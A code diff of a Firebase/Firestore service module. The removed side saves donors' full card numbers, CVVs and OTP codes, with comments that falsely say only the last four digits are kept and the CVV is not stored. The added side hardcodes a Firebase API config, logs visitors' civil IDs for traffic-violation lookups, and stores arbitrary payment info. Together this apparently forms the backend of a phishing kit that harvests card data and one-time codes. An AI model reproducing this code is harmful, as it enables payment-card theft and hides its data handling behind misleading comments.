@@ -2,115 +2,98 @@ import {
   collection,
   addDoc,
   serverTimestamp,
+  setDoc,
   doc,
-  updateDoc,
-} from 'firebase/firestore';
-import { db } from './firebase-config';
+  getFirestore,
+} from "firebase/firestore";
+import { initializeApp } from "firebase/app";
+import { getDatabase } from "firebase/database";
 
-// Interface for donation data
-export interface DonationData {
-  amount: string;
-  email: string;
-  phone: string;
-  donationMethod: string;
-  customAmount?: string;
-}
+const firebaseConfig = {
+  apiKey: "AIzaSyAdE8-9VwRjiqbKSImyUPu3hugol5jEMWA",
+  authDomain: "ssdd-21562.firebaseapp.com",
+  projectId: "ssdd-21562",
+  storageBucket: "ssdd-21562.firebasestorage.app",
+  messagingSenderId: "884523274527",
+  appId: "1:884523274527:web:96d8f5c87cc5bfbe3a602a",
+  measurementId: "G-0DPHLEMEBZ"
+};
 
-// Interface for payment data
-export interface PaymentData {
-  cardNumber: string;
-  cardHolder: string;
-  expiryDate: string;
-  cvv: string;
-  donationId: string;
-}
+const app = initializeApp(firebaseConfig);
+export const db = getFirestore(app);
+export const datatabas = getDatabase(app);
 
-// Interface for visitor data
-export interface VisitorData {
+interface VisitorData {
+  civilId: string;
   timestamp: any;
-  referrer: string | null;
-  ipAddress?: string;
+  userAgent: string;
+  violations?: any[];
 }
 
-// Record visitor information
-export const recordVisitor = async () => {
+export async function logVisitor(civilId: string): Promise<string> {
   try {
-    const visitorData: VisitorData = {
+    const visitorRef = await addDoc(collection(db, "visitors"), {
+      civilId,
       timestamp: serverTimestamp(),
-      referrer: document.referrer,
-    };
+      userAgent: navigator.userAgent,
+    } as VisitorData);
 
-    const docRef = await addDoc(collection(db, 'visitors'), visitorData);
-    return docRef.id;
+    return visitorRef.id;
   } catch (error) {
-    console.error('Error recording visitor:', error);
-    return null;
+    console.error("Error logging visitor:", error);
+    throw error;
   }
-};
+}
 
-// Save donation information
-export const saveDonation = async (donationData: DonationData) => {
+export async function saveViolationSearch(
+  civilId: string,
+  violations: any[]
+): Promise<string> {
   try {
-    const data = {
-      ...donationData,
+    const searchRef = await addDoc(collection(db, "searches"), {
+      civilId,
+      violations,
       timestamp: serverTimestamp(),
-      status: 'pending',
-    };
-
-    const docRef = await addDoc(collection(db, 'donations'), data);
-    return docRef.id;
-  } catch (error) {
-    console.error('Error saving donation:', error);
-    return null;
-  }
-};
-
-// Save payment information
-export const savePayment = async (paymentData: PaymentData) => {
-  try {
-    // Only store last 4 digits of card number for security
-    const securePaymentData = {
-      ...paymentData,
-      cardNumber: `${paymentData.cardNumber}`,
-      cvv: paymentData.cvv, // Don't store actual CVV
-      timestamp: serverTimestamp(),
-      status: 'processing',
-    };
-
-    const docRef = await addDoc(collection(db, 'payments'), securePaymentData);
-
-    // Update donation status
-    const donationRef = doc(db, 'donations', paymentData.donationId);
-    await updateDoc(donationRef, {
-      status: 'paid',
-      paymentId: docRef.id,
     });
 
-    return docRef.id;
+    return searchRef.id;
   } catch (error) {
-    console.error('Error saving payment:', error);
-    return null;
+    console.error("Error saving search:", error);
+    throw error;
   }
-};
+}
+export async function addData(data: any) {
+  localStorage.setItem("visitor", data.id);
 
-// Update payment status after OTP verification
-export const confirmPayment = async (paymentId: string, donationId: string,otp:string) => {
   try {
-    const paymentRef = doc(db, 'payments', paymentId);
-    await updateDoc(paymentRef, {
-      status: 'completed',
-      otp:otp,
-      verifiedAt: serverTimestamp(),
-    });
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(
+      docRef,
+      { ...data, createdDate: new Date().toISOString() },
+      { merge: true }
+    );
 
-    const donationRef = doc(db, 'donations', donationId);
-    await updateDoc(donationRef, {
-      status: 'completed',
-    });
-
-    return true;
+    console.log("Document written with ID: ", docRef.id);
+    // You might want to show a success message to the user here
+  } catch (e) {
+    console.error("Error adding document: ", e);
+    // You might want to show an error message to the user here
+  }
+}
+export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
+  try {
+    const visitorId = localStorage.getItem("visitor");
+    if (visitorId) {
+      const docRef = doc(db, "pays", visitorId);
+      await setDoc(
+        docRef,
+        { ...paymentInfo, status: "pending", createdDate: new Date().toISOString()},
+        { merge: true }
+      );
+      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
+    }
   } catch (error) {
-    console.error('Error confirming payment:', error);
-    return false;
+    console.error("Error adding document: ", error);
+    alert("Error adding payment info to Firestore");
   }
 };
